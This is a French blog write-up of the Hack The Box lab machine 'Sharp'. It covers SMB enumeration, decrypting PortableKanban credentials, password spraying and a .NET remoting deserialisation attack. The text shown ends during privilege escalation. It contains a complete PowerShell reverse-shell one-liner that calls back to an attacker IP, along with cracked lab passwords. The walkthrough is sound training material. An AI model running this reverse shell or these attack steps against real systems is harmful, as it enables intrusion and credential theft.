@@ -1,0 +1,697 @@
+
+  
+<!doctype html>
+<html class="no-js" lang="fr">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="siteBaseUrl" content="//luksec.fr">
+    <meta name="author" content="Luks">
+    <meta name="description" content="">
+    <meta name="keywords" content="blog,personal,ctf,htb,writeup,cyber,security">
+    <meta name="generator" content="Hugo 0.78.1" />
+    <title>
+        
+           
+               Hack The Box - Sharp &vert; Luks
+           
+        
+    </title>
+    <meta name="description" content="Hack The Box - Sharp - %!s(&lt;nil&gt;)">
+    <meta itemprop="name" content="Hack The Box - Sharp">
+    <meta itemprop="description" content="Hack The Box - Sharp - %!s(&lt;nil&gt;)">
+    <meta property="og:title" content="Hack The Box - Sharp">
+    <meta property="og:description" content="Hack The Box - Sharp - %!s(&lt;nil&gt;)">
+    <meta property="og:image" content="https://www.gravatar.com/avatar/d41d8cd98f00b204e9800998ecf8427e?size=200">
+    <meta property="og:url" content="//luksec.fr/fr/article/sharp/">
+    <meta property="og:site_name" content="Luks">
+    <meta property="og:type" content="article">
+
+    
+
+
+    <script src="/modernizr-simple.js"></script>
+
+    
+    <link href="/fr/article/sharp/" rel="alternate" type="application/rss+xml" title="Luks" />
+    <link href="/fr/article/sharp/" rel="feed" type="application/rss+xml" title="Luks" />
+    
+
+    
+
+    <link rel="stylesheet" href="//luksec.fr/theme.css">
+
+    
+
+    
+        
+            <link rel="stylesheet" href="//luksec.fr/css/custom.css">
+        
+    
+</head>
+
+<body class="bilberry-hugo-theme">
+
+    
+    <nav>
+
+    <div class="container">
+        <ul class="topnav">
+            
+                
+                    <li><a href="//luksec.fr/fr/page/notes/">Notes</a></li>
+                
+            
+                
+                    <li><a href="//luksec.fr/fr/page/whoami/">Whoami</a></li>
+                
+            
+        </ul>
+
+        
+    </div>
+</nav>
+
+
+    
+    <header>
+
+        <div class="container">
+            <div class="logo" style="border: none;">
+                <a href="//luksec.fr" class="logo">
+                    
+                        <img src="/img/avatar.jpg" alt="">
+                    
+
+                    <span class="overlay"><i class="fa fa-home"></i></span>
+                </a>
+            </div>
+            <div class="titles">
+                <h3 class="title">
+                    <a href="//luksec.fr">
+                        Luks
+                    </a>
+                </h3>
+
+                
+            </div>
+
+            <div class="languages">
+                
+                    
+                        <a href="//luksec.fr/">en</a>
+                    
+                
+                    
+                        <a href="//luksec.fr/fr/" class="active">fr</a>
+                    
+                
+                </div>
+            
+
+            
+                <div class="toggler">
+            
+                    <i class="fa fa-bars" aria-hidden="true"></i>
+                </div>
+            </div>
+    </header>
+
+
+    <div class="main container">
+        
+    <div class="article-wrapper u-cf single">
+        
+            <a class="bubble" href="//luksec.fr/fr/article/sharp/">
+    <i class="fas fa-fw fa-pencil-alt"></i>
+</a>
+
+<article class="default article">
+    
+
+    <div class="content">
+    <h1 class="article-title">
+        <a href="//luksec.fr/fr/article/sharp/">
+            Hack The Box - Sharp
+        </a>
+    </h1>
+
+    <div class="meta">
+        
+            
+                <span class="date moment">2021-05-12</span>
+            
+        
+
+        
+            
+                <span class="readingTime">7 Min. lecture</span>
+            
+        
+
+        
+            <span class="categories">
+                
+                    
+                    
+                        <a href="//luksec.fr/fr/categories/htb/">HTB</a>
+                    
+                
+                    
+                    
+                        <a href="//luksec.fr/fr/categories/ctf/">ctf</a>
+                    
+                
+                    
+                    
+                        <a href="//luksec.fr/fr/categories/write-up/">write-up</a>
+                    
+                
+                    
+                    
+                        <a href="//luksec.fr/fr/categories/windows/">windows</a>
+                    
+                
+            </span>
+        
+
+        
+            <span class="author">
+                
+                
+                    <a href="//luksec.fr/fr/author/luks/">Luks</a>
+                
+            </span>
+        
+    </div>
+
+    
+        
+
+        <p><img src="/img/sharp/sharp-fiche.png" alt=""></p>
+<p>Sharp est une <a href="https://app.hackthebox.eu/machines/Sharp">machine</a> difficile qui a été déployée sur Hack The Box le dimanche 6 décembre 2020 et créé par <strong>cube0x0</strong>.</p>
+<h1 id="résumé-rapide">Résumé rapide</h1>
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#reconnaissance">Reconnaissance</a>
+      <ul>
+        <li><a href="#scan-nmap">Scan Nmap</a></li>
+      </ul>
+    </li>
+    <li><a href="#enumération-smb">Enumération SMB</a></li>
+    <li><a href="#portable-kanban">Portable Kanban</a></li>
+    <li><a href="#dnspy">dnSpy</a></li>
+    <li><a href="#première-connexion">Première connexion</a>
+      <ul>
+        <li><a href="#génération-du-payload">Génération du payload</a></li>
+        <li><a href="#reverse-shell-powershell">Reverse shell Powershell</a></li>
+        <li><a href="#exploit-net-remoting">Exploit .NET remoting</a></li>
+        <li><a href="#utilisateur-lars">Utilisateur lars</a></li>
+      </ul>
+    </li>
+    <li><a href="#elévation-de-privilèges">Elévation de privilèges</a></li>
+  </ul>
+</nav>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="scan-nmap">Scan Nmap</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PORT     STATE SERVICE            VERSION
+135/tcp  open  msrpc              Microsoft Windows RPC
+139/tcp  open  netbios-ssn        Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+8888/tcp open  storagecraft-image StorageCraft Image Manager
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: -48m42s
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-05-07T13:04:04
+|_  start_date: N/A
+</code></pre></div><p>On retrouve :</p>
+<ul>
+<li>un service <code>rpc</code> sur le port <code>135/tcp</code></li>
+<li>un service <code>netbios-ssn</code> sur le port <code>139/tcp</code></li>
+<li>un service <code>smb</code> sur le port <code>445/tcp</code></li>
+<li>un service <code>storagecraft-image</code> sur le port <code>8888/tcp</code></li>
+<li>système d&rsquo;exploitation Windows</li>
+</ul>
+<h2 id="enumération-smb">Enumération SMB</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/infosec/htb/retired/sharp<span style="color:#f92672">]</span>
+└─$ smbmap -H sharp.htb                                                                                                                                                        <span style="color:#ae81ff">1</span> ⨯
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> IP: sharp.htb:445   Name: unknown                                           
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        dev                                                     NO ACCESS
+        IPC$                                                    NO ACCESS       Remote IPC
+        kanban                                                  READ ONLY
+</code></pre></div><p>On peut avoir accès en lecture seule au partage <code>kanban</code> .</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/infosec/htb/retired/sharp<span style="color:#f92672">]</span>
+└─$ smbmap -H sharp.htb -R kanban                       
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> IP: sharp.htb:445   Name: unknown                                           
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        kanban                                                  READ ONLY
+        .<span style="color:#ae81ff">\k</span>anban<span style="color:#ae81ff">\*</span>
+        dr--r--r--                <span style="color:#ae81ff">0</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    .
+        dr--r--r--                <span style="color:#ae81ff">0</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    ..
+        fr--r--r--            <span style="color:#ae81ff">58368</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    CommandLine.dll
+        fr--r--r--           <span style="color:#ae81ff">141312</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    CsvHelper.dll
+        fr--r--r--           <span style="color:#ae81ff">456704</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    DotNetZip.dll
+        dr--r--r--                <span style="color:#ae81ff">0</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:59 <span style="color:#ae81ff">2020</span>    Files
+        fr--r--r--            <span style="color:#ae81ff">23040</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    Itenso.Rtf.Converter.Html.dll
+        fr--r--r--            <span style="color:#ae81ff">75776</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    Itenso.Rtf.Interpreter.dll
+        fr--r--r--            <span style="color:#ae81ff">32768</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    Itenso.Rtf.Parser.dll
+        fr--r--r--            <span style="color:#ae81ff">19968</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    Itenso.Sys.dll
+        fr--r--r--           <span style="color:#ae81ff">376832</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    MsgReader.dll
+        fr--r--r--           <span style="color:#ae81ff">133296</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    Ookii.Dialogs.dll
+        fr--r--r--          <span style="color:#ae81ff">2558011</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    pkb.zip
+        dr--r--r--                <span style="color:#ae81ff">0</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    Plugins
+        fr--r--r--             <span style="color:#ae81ff">5819</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    PortableKanban.cfg
+        fr--r--r--           <span style="color:#ae81ff">118184</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    PortableKanban.Data.dll
+        fr--r--r--          <span style="color:#ae81ff">1878440</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    PortableKanban.exe
+        fr--r--r--            <span style="color:#ae81ff">31144</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    PortableKanban.Extensions.dll
+        fr--r--r--             <span style="color:#ae81ff">2080</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    PortableKanban.pk3
+        fr--r--r--             <span style="color:#ae81ff">2080</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    PortableKanban.pk3.bak
+        fr--r--r--               <span style="color:#ae81ff">34</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    PortableKanban.pk3.md5
+        fr--r--r--           <span style="color:#ae81ff">413184</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    ServiceStack.Common.dll
+        fr--r--r--           <span style="color:#ae81ff">137216</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    ServiceStack.Interfaces.dll
+        fr--r--r--           <span style="color:#ae81ff">292352</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    ServiceStack.Redis.dll
+        fr--r--r--           <span style="color:#ae81ff">411648</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    ServiceStack.Text.dll
+        fr--r--r--          <span style="color:#ae81ff">1050092</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    User Guide.pdf
+        .<span style="color:#ae81ff">\k</span>anban<span style="color:#ae81ff">\P</span>lugins<span style="color:#ae81ff">\*</span>
+        dr--r--r--                <span style="color:#ae81ff">0</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    .
+        dr--r--r--                <span style="color:#ae81ff">0</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    ..
+        fr--r--r--            <span style="color:#ae81ff">64424</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    PluginsLibrary.dll
+</code></pre></div><p>Il y a plusieurs fichiers qu&rsquo;on récupère avec <code>smbget</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/…/htb/retired/sharp/smb<span style="color:#f92672">]</span>
+└─$ smbget -a -R smb://sharp.htb/kanban                                                                                                                                        <span style="color:#ae81ff">1</span> ⨯
+Using workgroup WORKGROUP, guest user
+smb://sharp.htb/kanban/CommandLine.dll                                                                                                                                             
+smb://sharp.htb/kanban/CsvHelper.dll                                                                                                                                               
+smb://sharp.htb/kanban/DotNetZip.dll                                                                                                                                               
+smb://sharp.htb/kanban/Itenso.Rtf.Converter.Html.dll                                                                                                                               
+smb://sharp.htb/kanban/Itenso.Rtf.Interpreter.dll                                                                                                                                  
+smb://sharp.htb/kanban/Itenso.Rtf.Parser.dll                                                                                                                                       
+smb://sharp.htb/kanban/Itenso.Sys.dll                                                                                                                                              
+smb://sharp.htb/kanban/MsgReader.dll                                                                                                                                               
+smb://sharp.htb/kanban/Ookii.Dialogs.dll                                                                                                                                           
+smb://sharp.htb/kanban/pkb.zip                                                                                                                                                     
+smb://sharp.htb/kanban/Plugins/PluginsLibrary.dll                                                                                                                                  
+smb://sharp.htb/kanban/PortableKanban.cfg                                                                                                                                          
+smb://sharp.htb/kanban/PortableKanban.Data.dll                                                                                                                                     
+smb://sharp.htb/kanban/PortableKanban.exe                                                                                                                                          
+smb://sharp.htb/kanban/PortableKanban.Extensions.dll                                                                                                                               
+smb://sharp.htb/kanban/PortableKanban.pk3                                                                                                                                          
+smb://sharp.htb/kanban/PortableKanban.pk3.bak                                                                                                                                      
+smb://sharp.htb/kanban/PortableKanban.pk3.md5                                                                                                                                      
+smb://sharp.htb/kanban/ServiceStack.Common.dll                                                                                                                                     
+smb://sharp.htb/kanban/ServiceStack.Interfaces.dll                                                                                                                                 
+smb://sharp.htb/kanban/ServiceStack.Redis.dll                                                                                                                                      
+smb://sharp.htb/kanban/ServiceStack.Text.dll                                                                                                                                       
+smb://sharp.htb/kanban/User Guide.pdf                                                                                                                                              
+Downloaded 7.90MB in <span style="color:#ae81ff">5</span> seconds
+</code></pre></div><h2 id="portable-kanban">Portable Kanban</h2>
+<p>Plusieurs fichiers sont en lien avec la méthode agile de gestion de projet <a href="https://www.journaldunet.fr/web-tech/guide-de-l-entreprise-digitale/1443832-kanban-une-methode-agile-de-gestion-de-projet-visuelle-et-continue/">Kanban</a> comme <code>PortableKanban.exe</code> ou <code>PortableKanban.pk3</code></p>
+<p>En cherchant sur google, on retrouve un <a href="https://www.exploit-db.com/exploits/49409">exploit</a> qui nous permet de récupérer les creds des utilisateurs chiffrés en <a href="https://fr.wikipedia.org/wiki/Data_Encryption_Standard">DES</a>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/…/htb/retired/sharp/smb<span style="color:#f92672">]</span>
+└─$ python3 exploit.py PortableKanban.pk3
+Administrator:G2@$btRSHJYTarg
+lars:G123HHrth234gRG
+</code></pre></div><p>Transfert des fichiers avec <code>smbserver</code> sur une machine Windows pour RE avec <code>dnSpy</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/…/htb/retired/sharp/smb<span style="color:#f92672">]</span>
+└─$ sudo impacket-smbserver -smb2support -user luks -password luks share <span style="color:#66d9ef">$(</span>pwd<span style="color:#66d9ef">)</span>
+<span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali: 
+Impacket v0.9.22 - Copyright <span style="color:#ae81ff">2020</span> SecureAuth Corporation
+
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Callback added <span style="color:#66d9ef">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Callback added <span style="color:#66d9ef">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Incoming connection <span style="color:#f92672">(</span>192.168.1.16,50186<span style="color:#f92672">)</span>
+</code></pre></div><p><img src="/img/sharp/sharp-share.png" alt=""></p>
+<h2 id="dnspy">dnSpy</h2>
+<p><a href="https://github.com/dnSpy/dnSpy">dnSpy</a> est un débogueur et un éditeur d&rsquo;assemblage .NET.</p>
+<p>On ouvre les fichiers <code>PortableKanban.exe</code> et <code>PortableKanban.Data.dll</code> et le second fichier contient une classe <code>Crypto</code> qui contient les fonctions <code>Encrypt</code> et <code>Decrypt</code>.</p>
+<p><img src="/img/sharp/sharp-dnspy.png" alt=""></p>
+<p>Le code utilise une chaîne chiffrée en entrée et décode le contenu en base64. On voit également qu&rsquo;il s&rsquo;agit de l&rsquo;algorithme DES avec une clé codée en dur et des valeurs iv pour décrypter le contenu.</p>
+<p>Création de deux wordlists <code>user.txt</code> et <code>password.txt</code> et utilisation de <a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a> pour <a href="https://doubleoctopus.com/security-wiki/threats-and-tools/password-spraying/">password spraying</a>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/infosec/htb/retired/sharp<span style="color:#f92672">]</span>
+└─$ crackmapexec smb sharp.htb -u user.txt -p password.txt 
+SMB         10.10.10.219    <span style="color:#ae81ff">445</span>    SHARP            <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows 10.0 Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:SHARP<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:Sharp<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
+SMB         10.10.10.219    <span style="color:#ae81ff">445</span>    SHARP            <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Sharp<span style="color:#ae81ff">\A</span>dministrator:G2@$btRSHJYTarg STATUS_LOGON_FAILURE 
+SMB         10.10.10.219    <span style="color:#ae81ff">445</span>    SHARP            <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Sharp<span style="color:#ae81ff">\A</span>dministrator:G123HHrth234gRG STATUS_LOGON_FAILURE 
+SMB         10.10.10.219    <span style="color:#ae81ff">445</span>    SHARP            <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Sharp<span style="color:#ae81ff">\l</span>ars:G2@$btRSHJYTarg STATUS_LOGON_FAILURE 
+SMB         10.10.10.219    <span style="color:#ae81ff">445</span>    SHARP            <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Sharp<span style="color:#ae81ff">\l</span>ars:G123HHrth234gRG
+</code></pre></div><p>On peut accéder en lecture seule au partage <code>dev</code> avec l&rsquo;utilisateur <code>lars</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/…/htb/retired/sharp/smb<span style="color:#f92672">]</span>
+└─$ smbmap -H sharp.htb -u <span style="color:#e6db74">&#34;lars&#34;</span> -p <span style="color:#e6db74">&#34;G123HHrth234gRG&#34;</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> IP: sharp.htb:445   Name: unknown                                           
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        dev                                                     READ ONLY
+        IPC$                                                    READ ONLY       Remote IPC
+        kanban                                                  NO ACCESS
+</code></pre></div><p>Enumération du partage et récupérer des fichiers</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/…/htb/retired/sharp/smb<span style="color:#f92672">]</span>
+└─$ smbmap -H sharp.htb -u <span style="color:#e6db74">&#34;lars&#34;</span> -p <span style="color:#e6db74">&#34;G123HHrth234gRG&#34;</span> -R dev
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> IP: sharp.htb:445   Name: unknown                                           
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        dev                                                     READ ONLY
+        .<span style="color:#ae81ff">\d</span>ev<span style="color:#ae81ff">\*</span>
+        dr--r--r--                <span style="color:#ae81ff">0</span> Sun Nov <span style="color:#ae81ff">15</span> 06:30:13 <span style="color:#ae81ff">2020</span>    .
+        dr--r--r--                <span style="color:#ae81ff">0</span> Sun Nov <span style="color:#ae81ff">15</span> 06:30:13 <span style="color:#ae81ff">2020</span>    ..
+        fr--r--r--             <span style="color:#ae81ff">5632</span> Sun Nov <span style="color:#ae81ff">15</span> 05:25:01 <span style="color:#ae81ff">2020</span>    Client.exe
+        fr--r--r--               <span style="color:#ae81ff">70</span> Sun Nov <span style="color:#ae81ff">15</span> 08:59:02 <span style="color:#ae81ff">2020</span>    notes.txt
+        fr--r--r--             <span style="color:#ae81ff">4096</span> Sun Nov <span style="color:#ae81ff">15</span> 05:25:01 <span style="color:#ae81ff">2020</span>    RemotingLibrary.dll
+        fr--r--r--             <span style="color:#ae81ff">6144</span> Mon Nov <span style="color:#ae81ff">16</span> 06:55:44 <span style="color:#ae81ff">2020</span>    Server.exe
+
+-- snipp --
+
+──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/…/htb/retired/sharp/smb<span style="color:#f92672">]</span>
+└─$ sudo smbget -a -R smb://sharp.htb/dev -U <span style="color:#e6db74">&#34;lars%G123HHrth234gRG&#34;</span>                                                                                                            <span style="color:#ae81ff">1</span> ⨯
+Using workgroup WORKGROUP, user lars
+smb://sharp.htb/dev/Client.exe                                                                                                                                                     
+smb://sharp.htb/dev/notes.txt                                                                                                                                                      
+smb://sharp.htb/dev/RemotingLibrary.dll                                                                                                                                            
+smb://sharp.htb/dev/Server.exe                                                                                                                                                     
+Downloaded 15.57kB in <span style="color:#ae81ff">0</span> seconds
+</code></pre></div><p>Fichier <code>notes.txt</code> qui nous révèle des indices.</p>
+<p><img src="/img/sharp/sharp-note.png" alt=""></p>
+<p>Quand on analyse le fichier <code>Server.exe</code> avec dnSpy, on retrouve un module <code>RemotingSample</code> qui contient deux fonctions :</p>
+<ul>
+<li><code>Main()</code> qui créer un thread et exécute <code>Startserver</code>.</li>
+</ul>
+<p><img src="/img/sharp/sharp-main.png" alt=""></p>
+<ul>
+<li><code>Startserver()</code> est un service qui écoute sur le port <code>8888</code> et expose l&rsquo;instance de l&rsquo;objet <code>SecretSharpDebugApplicationEndpoint</code></li>
+</ul>
+<p><img src="/img/sharp/sharp-start.png" alt=""></p>
+<p>La fonction <code>main()</code> du fichier <code>client.exe</code> montre la connection sur le même endpoint avec des creds.</p>
+<p><img src="/img/sharp/sharp-creds.png" alt=""></p>
+<p><code>debug:SharpApplicationDebugUserPassword123!</code></p>
+<h2 id="première-connexion">Première connexion</h2>
+<p>En cherchant <code>export .NET remoting</code> sur Google, on retrouve cet <a href="https://parsiya.net/blog/2015-11-14-intro-to-.net-remoting-for-hackers/">article</a> qui donne une introduction au <code>.NET remoting</code> et ce <a href="https://research.nccgroup.com/2019/03/19/finding-and-exploiting-net-remoting-over-http-using-deserialisation/">POC</a> qui explique la manière d&rsquo;exploiter cette vuln. Ainsi que le <a href="https://github.com/parteeksingh005/ExploitRemotingService_Compiled">repo</a> github de <code>Parteek Singh</code> qui présente les outils compilés pour faciliter l&rsquo;attaque.</p>
+<p>Je télécharge les fichiers sur la machine Windows et <a href="https://github.com/pwntester/ysoserial.net">ysoserial.net</a> pour générer un payload .NET sérialisée.</p>
+<h3 id="génération-du-payload">Génération du payload</h3>
+<p><img src="/img/sharp/sharp-payload.png" alt=""></p>
+<h3 id="reverse-shell-powershell">Reverse shell Powershell</h3>
+<p>Récupération du reverse shell one-liner sur le <a href="https://github.com/0xLuks/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1">repo</a> de <code>nishang</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$client = New-Object System.Net.Sockets.TCPClient(<span style="color:#e6db74">&#34;10.10.14.42&#34;</span>,1337);$stream = $client.GetStream();<span style="color:#66d9ef">[byte[]]</span>$bytes = 0..65535|%{0};<span style="color:#66d9ef">while</span>(($i = $stream.Read($bytes, 0, $bytes.Length)) <span style="color:#f92672">-ne</span> 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + <span style="color:#e6db74">&#34;PS &#34;</span> + (pwd).Path + <span style="color:#e6db74">&#34;&gt; &#34;</span>;$sendbyte = (<span style="color:#66d9ef">[text.encoding]</span>::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+</code></pre></div><p>Création d&rsquo;un serveur web python</p>
+<p><img src="/img/sharp/sharp-python.png" alt=""></p>
+<p>Mise en place d&rsquo;un listener sur le port <code>1337</code></p>
+<p><img src="/img/sharp/sharp-nc.png" alt=""></p>
+<h3 id="exploit-net-remoting">Exploit .NET remoting</h3>
+<p><img src="/img/sharp/sharp-foothold.png" alt=""></p>
+<h3 id="utilisateur-lars">Utilisateur lars</h3>
+<p>On obtient un shell malgré le message d&rsquo;erreur en tant que <code>lars</code> et on peut récupérer le premier flag <code>user.txt</code>.</p>
+<p><img src="/img/sharp/sharp-user.txt.png" alt=""></p>
+<h2 id="elévation-de-privilèges">Elévation de privilèges</h2>
+<p>Dans le répertoire <code>Documents</code> de l&rsquo;utilisateur, on trouve un dossier <code>wcf</code> qui contient un projet <code>Visual Studio</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">PS C:\Users\lars\Documents\wcf&gt; ls
+
+
+    Directory<span style="color:#960050;background-color:#1e0010">:</span> C:\Users\lars\Documents\wcf
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----       11/15/2020   1<span style="color:#960050;background-color:#1e0010">:</span>40 PM                .vs
+d-----       11/15/2020   1<span style="color:#960050;background-color:#1e0010">:</span>40 PM                Client
+d-----       11/15/2020   1<span style="color:#960050;background-color:#1e0010">:</span>40 PM                packages
+d-----       11/15/2020   1<span style="color:#960050;background-color:#1e0010">:</span>40 PM                RemotingLibrary
+d-----       11/15/2020   1<span style="color:#960050;background-color:#1e0010">:</span>41 PM                Server
+-a----       11/15/2020  12<span style="color:#960050;background-color:#1e0010">:</span>47 PM           2095 wcf.sln
+</code></pre></div><p>Je créer une archive <code>wcf.zip</code> que je place dans le partage <code>dev</code> pour pouvoir télécharger les fichiers pour les analyser plus tard en local.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Compress-Archive -Path C:\Users\lars\Documents\wcf -DestinationPath c:\dev\wcf.zip
+
+-- snipp --
+
+PS C:\Users\Luks\Desktop\ysoserial-dotnet&gt; net use G: \\10.10.10.219\dev /user<span style="color:#960050;background-color:#1e0010">:</span>lars G123HHrth234gRG
+La commande s<span style="color:#960050;background-color:#1e0010">’</span>est terminée correctement.
+
+PS C:\Users\Luks\Desktop\ysoserial-dotnet&gt; cd ..
+PS C:\Users\Luks\Desktop&gt; copy G:\wcf.zip .
+PS C:\Users\Luks\Desktop&gt; ls
+
+
